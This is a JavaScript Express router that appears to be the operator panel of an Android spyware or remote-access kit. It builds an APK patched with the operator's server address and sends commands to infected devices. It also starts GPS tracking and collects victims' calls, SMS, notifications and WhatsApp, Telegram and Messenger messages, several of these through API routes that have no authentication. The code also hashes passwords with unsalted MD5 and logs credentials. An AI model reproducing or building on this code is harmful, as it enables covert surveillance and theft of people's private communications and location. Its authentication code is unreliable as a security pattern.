const express = require("express");
const crypto = require("crypto");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const asyncHandler = require("express-async-handler");
const apkBuilder = require("./apkBuilder");

const routes = express.Router();

// Debug middleware (only in development)
if (process.env.NODE_ENV === 'development') {
  routes.use((req, res, next) => {
    console.log('=== Request Debug ===');
    console.log('URL:', req.url);
    console.log('Method:', req.method);
    console.log('Headers:', req.headers);
    console.log('Cookies:', req.cookies);
    next();
  });
}

function isAllowed(req, res, next) {
  try {
    let cookies = req.cookies;
    let loginToken = global.db.getMainDb().get("admin.loginToken").value();
    if ("loginToken" in cookies) {
      if (cookies.loginToken === loginToken) next();
      else res.clearCookie("loginToken").redirect("/login");
    } else res.redirect("/login");
  } catch (error) {
    console.error('Error in isAllowed middleware:', error);
    res.redirect("/login");
  }
}

routes.get("/dl", (req, res) => {
  res.redirect("/app-release.apk");
});

routes.post("/build", isAllowed, asyncHandler(async (req, res) => {
    try {
        const { uri, port, protocol } = req.body;
        if (!uri || !port) {
            return res.status(400).json({ error: "URI and Port are required" });
        }

        const fullUri = protocol ? `${protocol}://${uri}` : `http://${uri}`;
        const portNum = parseInt(port, 10);

        console.log(`Building APK for ${fullUri}:${portNum}`);

        await apkBuilder.patchAPK(fullUri, portNum);
        const apkPath = await apkBuilder.buildAPK();

        res.json({
            success: true,
            downloadUrl: '/app-release.apk' 
        });
    } catch (error) {
        console.error("Build failed:", error);
        res.status(500).json({ error: error.message });
    }
}));

routes.get("/home", (req, res) => {
  res.render("home");
});

// Main route - check if user is logged in, if not redirect to login
routes.get("/", (req, res) => {
  try {
    let cookies = req.cookies || {};
    let loginToken = "";
    
    console.log('=== Main Route Debug ===');
    console.log('Cookies received:', cookies);
    console.log('Request headers:', req.headers.cookie);
    
    try {
      loginToken = global.db.getMainDb().get("admin.loginToken").value();
      console.log('Database token:', loginToken);
    } catch (dbError) {
      console.error('Database error:', dbError);
      return res.redirect("/login");
    }
    
    // Check if user has valid login token
    const userToken = cookies.loginToken;
    console.log('User token from cookie:', userToken);
    console.log('Token comparison:', userToken === loginToken);
    
    if (userToken && userToken === loginToken && loginToken !== "") {
      // User is logged in: redirect to /dashboard
      console.log('✅ User authenticated, redirecting to /dashboard');
      return res.redirect("/dashboard");
    } else {
      // User not logged in
      console.log('❌ User not authenticated, redirecting to /login');
      return res.redirect("/login");
    }
  } catch (error) {
    console.error('Error in main route:', error);
    return res.redirect("/login");
  }
});

routes.get("/login", (req, res) => {
  res.render("login");
});

routes.post("/login", (req, res) => {
  try {
    console.log('=== Login Attempt Debug ===');
    console.log('Request body:', req.body);
    console.log('Content-Type:', req.get('Content-Type'));
    
    if ("username" in req.body) {
      if ("password" in req.body) {
        // Force reload database to ensure latest credentials
        global.db.getMainDb().read();
        
        let rUsername = global.db.getMainDb().get("admin.username").value();
        let rPassword = global.db.getMainDb().get("admin.password").value();
        let passwordMD5 = crypto
          .createHash("md5")
          .update(req.body.password.toString())
          .digest("hex");
        
        console.log('Username check:', req.body.username.toString(), 'vs', rUsername);
        console.log('Password check:', passwordMD5, 'vs', rPassword);
        
        if (
          req.body.username.toString() === rUsername &&
          passwordMD5 === rPassword
        ) {
          let loginToken = crypto
            .createHash("md5")
            .update(Math.random().toString() + new Date().toString())
            .digest("hex");
          
          console.log('✅ Login successful, setting token:', loginToken);
          
          // Update database with new token
          global.db.getMainDb().get("admin").assign({ loginToken }).write();
          console.log('✅ Token saved to database');
          
          // Set cookie with proper options
          res.cookie("loginToken", loginToken, {
            httpOnly: false,
            secure: false, // Set to true if using HTTPS
            maxAge: 24 * 60 * 60 * 1000, // 24 hours
            path: '/',
            sameSite: 'lax'
          });
          
          console.log('✅ Cookie set successfully');
          console.log('🔄 Redirecting to dashboard...');
          
          // Use 302 redirect to ensure proper redirect
          res.status(302).redirect("/");
        } else {
          console.log('❌ Login failed: invalid credentials');
          return res.redirect("/login?e=badLogin");
        }
      } else {
        console.log('❌ Login failed: missing password');
        return res.redirect("/login?e=missingPassword");
      }
    } else {
      console.log('❌ Login failed: missing username');
      return res.redirect("/login?e=missingUsername");
    }
  } catch (error) {
    console.error('❌ Error in login:', error);
    res.redirect("/login?e=error");
  }
});

routes.get("/logout", isAllowed, (req, res) => {
  try {
    global.db.getMainDb().get("admin").assign({ loginToken: "" }).write();
    res.redirect("/");
  } catch (error) {
    console.error('Error in logout:', error);
    res.redirect("/");
  }
});

routes.get("/builder", isAllowed, (req, res) => {
  try {
    const controlPort = process.env.CONTROL_PORT || 22222;
    res.render("builder", {
      myPort: controlPort,
    });
  } catch (error) {
    console.error('Error rendering builder:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.post("/build", isAllowed, asyncHandler(async (req, res) => {
    try {
        const { uri, port, protocol } = req.body;
        if (!uri || !port) {
            return res.status(400).json({ error: 'Missing uri or port' });
        }
        
        // Construct full URI if protocol is provided
        let fullUri = uri;
        if (protocol && !uri.startsWith('http')) {
            fullUri = `${protocol}://${uri}`;
        }
        
        const portNum = parseInt(port, 10);
        
        await apkBuilder.patchAPK(fullUri, portNum);
        const apkPath = await apkBuilder.buildAPK();
        
        res.json({ success: true, downloadUrl: '/app-release.apk' });
    } catch (error) {
        console.error('Build error:', error);
        res.status(500).json({ error: error.message });
    }
}));

routes.get("/logs", isAllowed, (req, res) => {
  try {
    res.render("logs", {
      logs: global.logManager.getLogs(),
    });
  } catch (error) {
    console.error('Error rendering logs:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

//Password Changing
routes.post(
  "/changepass",
  isAllowed,
  asyncHandler(async (req, res) => {
    try {
      let pass = await req.body.pass;
      if (pass.toString() == undefined) res.json({ error: "Password empty" });
      else {
        let password = crypto.createHash("md5").update(pass).digest("hex");
        global.db.getMainDb().get("admin").assign({ password }).write();
        res.send("200");
      }
    } catch (error) {
      console.error('Error changing password:', error);
      res.status(500).json({ error: "Internal server error" });
    }
  })
);

routes.get("/changepass", isAllowed, (req, res) => {
  res.render("changePassword");
});

routes.get("/manage/:deviceid/:page", isAllowed, (req, res) => {
  try {
    let pageData = global.clientManager.getClientDataByPage(
      req.params.deviceid,
      req.params.page,
      req.query.filter
    );
    if (pageData) {
      res.render("deviceManager", {
        deviceid: req.params.deviceid,
        page: req.params.page,
        pageData: pageData,
        baseURL: `/manage/${req.params.deviceid}`,
      });
    } else {
      res.render("deviceManager", {
        deviceid: req.params.deviceid,
        page: req.params.page,
        pageData: [],
        baseURL: `/manage/${req.params.deviceid}`,
      });
    }
  } catch (error) {
    console.error('Error rendering device manager:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.post("/manage/:deviceid/:commandID", isAllowed, (req, res) => {
  try {
    let commandPayload = req.body;
    global.clientManager.checkCorrectParams(
      req.params.commandID,
      commandPayload,
      (result) => {
        if (result === false) {
          global.clientManager.sendCommand(
            req.params.deviceid,
            req.params.commandID,
            commandPayload
          );
          res.json({ status: "Command sent successfully" });
        } else {
          res.json({ error: result });
        }
      }
    );
  } catch (error) {
    console.error('Error sending command:', error);
    res.status(500).json({ error: "Internal server error" });
  }
});

routes.post("/manage/:deviceid/GPSPOLL/:speed", isAllowed, (req, res) => {
  try {
    global.clientManager.sendCommand(
      req.params.deviceid,
      global.CONST.messageKeys.location,
      { action: "start", speed: req.params.speed }
    );
    res.json({ status: "GPS polling started" });
  } catch (error) {
    console.error('Error starting GPS polling:', error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// API Routes for Dashboard
routes.get('/api/stats', (req, res) => {
    try {
        const mainDb = global.db.getMainDb();
        const clients = mainDb.get('clients').value() || [];
        
        const stats = {
            total: clients.length,
            online: clients.filter(client => client.isOnline).length,
            offline: clients.filter(client => !client.isOnline).length
        };
        
        res.json(stats);
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

routes.get('/api/devices', (req, res) => {
    try {
        const mainDb = global.db.getMainDb();
        const clients = mainDb.get('clients').value() || [];
        
        const devices = clients.map(client => ({
            clientID: client.clientID,
            isOnline: client.isOnline || false,
            lastSeen: client.lastSeen || new Date(),
            firstSeen: client.firstSeen || new Date()
        }));
        
        res.json({ devices });
    } catch (error) {
        console.error('Error getting devices:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

routes.get('/api/logs/calls', (req, res) => {
    try {
        const mainDb = global.db.getMainDb();
        const clients = mainDb.get('clients').value() || [];
        let allCalls = [];
        
        clients.forEach(client => {
            try {
                const clientDb = global.db.getClientDb(client.clientID);
                const calls = clientDb.get('CallData').value() || [];
                const callsWithId = calls.map(call => ({ ...call, clientID: client.clientID }));
                allCalls = allCalls.concat(callsWithId);
            } catch (e) {
                // Ignore if client DB issue
            }
        });
        
        allCalls.sort((a, b) => new Date(b.date || b.time) - new Date(a.date || a.time));
        res.json(allCalls);
    } catch (error) {
        console.error('Error getting call logs:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

routes.get('/api/logs/sms', (req, res) => {
    try {
        const mainDb = global.db.getMainDb();
        const clients = mainDb.get('clients').value() || [];
        let allSMS = [];
        
        clients.forEach(client => {
            try {
                const clientDb = global.db.getClientDb(client.clientID);
                const sms = clientDb.get('SMSData').value() || [];
                const smsWithId = sms.map(msg => ({ ...msg, clientID: client.clientID }));
                allSMS = allSMS.concat(smsWithId);
            } catch (e) {}
        });
        
        allSMS.sort((a, b) => new Date(b.date || b.time) - new Date(a.date || a.time));
        res.json(allSMS);
    } catch (error) {
        console.error('Error getting sms logs:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

routes.get('/api/logs/notifications', (req, res) => {
    try {
        const mainDb = global.db.getMainDb();
        const clients = mainDb.get('clients').value() || [];
        let allNotifs = [];
        
        clients.forEach(client => {
            try {
                const clientDb = global.db.getClientDb(client.clientID);
                const notifs = clientDb.get('notificationLog').value() || [];
                const notifsWithId = notifs.map(n => ({ ...n, clientID: client.clientID }));
                allNotifs = allNotifs.concat(notifsWithId);
            } catch (e) {}
        });
        
        allNotifs.sort((a, b) => new Date(b.postTime || b.time) - new Date(a.postTime || a.time));
        res.json(allNotifs);
    } catch (error) {
        console.error('Error getting notification logs:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

routes.get('/api/logs/chat', (req, res) => {
    try {
        const mainDb = global.db.getMainDb();
        const clients = mainDb.get('clients').value() || [];
        let allMessages = [];
        
        clients.forEach(client => {
            try {
                const clientDb = global.db.getClientDb(client.clientID);
                
                // WhatsApp
                const whatsapp = clientDb.get('whatsappMessages').value() || [];
                whatsapp.forEach(msg => {
                    allMessages.push({
                        clientID: client.clientID,
                        app: 'whatsapp',
                        time: msg.time,
                        ...(msg.data || {})
                    });
                });
                
                // Telegram
                const telegram = clientDb.get('telegramMessages').value() || [];
                telegram.forEach(msg => {
                    allMessages.push({
                        clientID: client.clientID,
                        app: 'telegram',
                        time: msg.time,
                        ...(msg.data || {})
                    });
                });
                
                // Messenger
                const messenger = clientDb.get('messengerMessages').value() || [];
                messenger.forEach(msg => {
                    allMessages.push({
                        clientID: client.clientID,
                        app: 'messenger',
                        time: msg.time,
                        ...(msg.data || {})
                    });
                });
                
            } catch (e) {}
        });
        
        allMessages.sort((a, b) => new Date(b.time) - new Date(a.time));
        res.json(allMessages);
    } catch (error) {
        console.error('Error getting chat logs:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Dashboard route
routes.get("/dashboard", isAllowed, (req, res) => {
  try {
    res.render("index");
  } catch (error) {
    console.error('Error rendering dashboard:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

// Ensure /devices route exists and is protected
routes.get("/devices", isAllowed, (req, res) => {
  try {
    res.render("devices");
  } catch (error) {
    console.error('Error rendering devices:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/devices/online", isAllowed, (req, res) => {
  try {
    res.render("devices_online");
  } catch (error) {
    console.error('Error rendering devices_online:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/devices/offline", isAllowed, (req, res) => {
  try {
    res.render("devices_offline");
  } catch (error) {
    console.error('Error rendering devices_offline:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/backup", isAllowed, (req, res) => {
  try {
    res.render("backup");
  } catch (error) {
    console.error('Error rendering backup:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/updates", isAllowed, (req, res) => {
  try {
    res.render("updates");
  } catch (error) {
    console.error('Error rendering updates:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/profile", isAllowed, (req, res) => {
  try {
    res.render("profile");
  } catch (error) {
    console.error('Error rendering profile:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/monitoring/calls", isAllowed, (req, res) => {
  try {
    res.render("monitoring_calls");
  } catch (error) {
    console.error('Error rendering monitoring_calls:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/monitoring/sms", isAllowed, (req, res) => {
  try {
    res.render("monitoring_sms");
  } catch (error) {
    console.error('Error rendering monitoring_sms:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/monitoring/notifications", isAllowed, (req, res) => {
  try {
    res.render("monitoring_notifications");
  } catch (error) {
    console.error('Error rendering monitoring_notifications:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

routes.get("/monitoring/chat", isAllowed, (req, res) => {
  try {
    res.render("monitoring_chat");
  } catch (error) {
    console.error('Error rendering monitoring_chat:', error);
    res.status(500).render("error", { error: "Internal server error" });
  }
});

module.exports = routes;
